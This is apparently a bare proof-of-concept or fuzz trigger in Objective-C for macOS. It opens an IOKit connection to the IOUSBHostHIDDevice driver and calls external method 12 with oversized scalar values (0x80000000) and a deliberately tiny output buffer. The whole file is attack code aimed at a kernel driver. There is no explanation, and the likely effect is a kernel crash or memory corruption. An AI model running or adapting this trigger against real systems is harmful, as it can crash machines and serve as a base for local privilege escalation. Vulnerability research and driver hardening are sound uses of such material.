#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    io_iterator_t iterator;
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOUSBHostHIDDevice"), &iterator);
    io_service_t svc = IOIteratorNext(iterator);
    io_connect_t conn;
    assert(KERN_SUCCESS == IOServiceOpen(svc, mach_task_self(), 0, &conn));
    
    uint64_t inscalar[3] = {0x80000000, 0x80000000, 0x80000000};
    size_t inscalarcnt = 3;
    char inputstruct[10240] = {0};
    memset(inputstruct, 'a', sizeof(inputstruct));
    uint32_t outputcnt;
    size_t outputStructCnt;
    /* //IOConnectCallMethod(<#mach_port_t connection#>, <#uint32_t selector#>, <#const uint64_t *input#>, <#uint32_t inputCnt#>, <#const void *inputStruct#>, <#size_t inputStructCnt#>, <#uint64_t *output#>, <#uint32_t *outputCnt#>, <#void *outputStruct#>, <#size_t *outputStructCnt#>)*/
    size_t outcnt = 1;
    char outstruct[1];
    IOConnectCallMethod(conn, 12, inscalar, inscalarcnt, 0, 0, 0, 0, outstruct, &outcnt);
}